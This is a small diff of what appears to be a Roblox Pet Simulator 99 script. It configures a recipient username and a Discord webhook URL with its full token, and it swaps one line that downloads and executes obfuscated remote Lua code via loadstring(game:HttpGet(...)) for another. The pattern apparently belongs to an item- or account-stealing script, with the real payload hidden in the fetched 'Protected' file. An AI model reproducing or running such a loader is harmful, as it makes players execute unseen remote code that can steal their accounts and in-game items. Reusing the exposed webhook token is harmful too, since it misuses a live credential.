@@ -1,4 +1,4 @@
 Username = "jheremyqt1"
 Webhook = "https://discord.com/api/webhooks/1207314422398459965/WGk0y687HxVCqdhTM0ty-JVEwKksybbo9dR5cU5D0lHfwuhcLQiUsJXPs8sxMXsGI0UD"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulator99x/PS99SCRIPT/main/PREMIUM"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulator99x/PS99./main/Protected_2104014153733328.lua"))()
